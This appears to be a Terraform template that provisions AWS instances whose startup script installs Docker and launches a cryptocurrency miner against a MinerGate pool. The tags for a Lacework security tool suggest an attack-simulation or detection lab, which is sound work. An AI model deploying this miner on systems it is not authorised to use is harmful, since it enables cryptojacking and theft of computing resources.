terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 4.0"
    }
  }
}

data "aws_ami" "ubuntu_focal" {
  most_recent = true

  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*"]
  }

  filter {
    name   = "virtualization-type"
    values = ["hvm"]
  }

  owners = ["099720109477"] # Canonical
}

data "aws_ami" "amazon_linux" {
  owners = ["amazon"]
  most_recent = true

  filter {
    name   = "name"
    values = ["amzn2-ami-hvm-*-x86_64-ebs"]
  }
}

locals {
    region          = "${ region }"
    name            = "${ name }"
    instances       = ${ instances }
    user_data       = <<-EOT
                      #!/bin/bash
                      # install docker
                      sudo apt-get remove -y docker docker-engine docker.io containerd runc
                      sudo apt-get update
                      sudo apt-get install -y \
                          ca-certificates \
                          curl \
                          gnupg \
                          lsb-release
                      sudo mkdir -p /etc/apt/keyrings
                      curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
                      echo \
                        "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
                        $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
                      sudo apt-get update
                      sudo apt-get install -y \
                        docker-ce \
                        docker-ce-cli \
                        containerd.io \
                        docker-compose-plugin
                      sudo docker run --rm -d --network=host --name minerd_miner mkell43/minerd -a cryptonight -o stratum+tcp://eth.pool.minergate.com:45791 -u ${ minergate_user } -p x
                      EOT
    ami_map = {
        ubuntu_focal = data.aws_ami.ubuntu_focal.id
        amazon_linux = data.aws_ami.amazon_linux.id
    }
}

data "aws_caller_identity" "current" {}

resource "aws_vpc" "public" {
  cidr_block = "172.20.0.0/16"
  enable_dns_hostnames = true
  enable_dns_support = true
  tags = {
    Name = "$${local.name}-public-vpc"
  }
}

resource "aws_internet_gateway" "public" {
  vpc_id = aws_vpc.public.id

  tags = {
    Name = "$${local.name}-public-internet-gw"
  }
}

resource "aws_subnet" "public" {
    vpc_id            = aws_vpc.public.id
    cidr_block        = "172.20.10.0/24"
    availability_zone = "us-east-1b"
    
    map_public_ip_on_launch = true
    
    tags = {
        Name = "$${local.name}-public-subnet"
    }
}

resource "aws_route_table" "public" {
    vpc_id = aws_vpc.public.id

    route {
        cidr_block = "0.0.0.0/0"
        gateway_id = aws_internet_gateway.public.id
    }

    tags = {
        Name = "$${local.name}-default-public-internet-gw-route"
    }
}

resource "aws_route_table_association" "public" {
  subnet_id = aws_subnet.public.id
  route_table_id = aws_route_table.public.id
}

resource "aws_security_group" "miner" {
  name   = "$${local.name}-sg"
  vpc_id = aws_vpc.public.id

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
# this profile configured as per ssm management
# https://docs.aws.amazon.com/systems-manager/latest/userguide/setup-instance-profile.html
data "aws_iam_instance_profile" "ssm" {
  name = "ec2_profile"
}

resource "aws_instance" "miner" {
    count           = local.instances
    ami             = "ami-0d70b8dd4ec1e2d1e"
    instance_type   = "t2.micro"
    
    subnet_id = aws_subnet.public.id
    vpc_security_group_ids =    [aws_security_group.miner.id]

    # user_data_base64 = base64encode(data.template_file.user_data.rendered)
    user_data_base64 = base64encode(local.user_data)
    
    associate_public_ip_address = true
    
    # borrowed from existing environment
    iam_instance_profile = data.aws_iam_instance_profile.ssm.name

    # leverage existing ssm deployment of lacework
    tags = {
        Name = "$${local.name}-$${count.index}"
        ssm_deploy_lacework = "true"
    }

    user_data_replace_on_change = true
}
